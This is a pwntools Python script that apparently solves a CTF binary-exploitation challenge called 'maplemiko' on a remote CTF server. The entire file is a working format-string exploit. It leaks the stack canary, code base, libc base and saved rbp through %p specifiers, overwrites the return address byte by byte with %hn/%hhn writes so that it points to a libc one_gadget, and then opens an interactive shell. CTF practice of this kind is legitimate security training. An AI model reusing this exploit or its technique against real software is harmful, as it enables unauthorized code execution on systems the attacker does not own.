from pwn import *

# p = process('./distribute/share/maplemiko')
p = remote('ctf.adl.tw', 10007)
elf = ELF('./distribute/share/maplemiko')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')


def leak(payload):
    p.sendlineafter(b'think: ', payload)
    p.recvuntil(b'Nyeeeeee~ ')
    ret = int(p.recvline().strip(), 16)
    p.sendlineafter(b'Quit? ', b'n')
    return ret


def send_payload(num, offset):
    payload = b'%' + num + b'c%' + offset
    p.sendlineafter(b'think: ', payload)
    p.sendlineafter(b'Quit? ', b'n')


code_base = leak(b'%13$p') - elf.sym['main']
success('code base: 0x%x', code_base)
canary = leak(b'%7$p')
success('canary: 0x%x', canary)
libc_base = leak(b'%9$p') - 159923
success('libc base: 0x%x', libc_base)
rbp = leak(b'%11$p') - 248
success('rbp: 0x%x', rbp)

one_gadget = libc_base + 0xe6c81

for i in range(0, 6):
    send_payload(str((rbp+8+i) & 0xffff).encode(), b'11$hn')
    send_payload(str((one_gadget >> (8*i)) & 0xff).encode(), b'39$hhn')


p.sendlineafter(b'think: ', b'123')
p.sendline('y')

p.interactive()
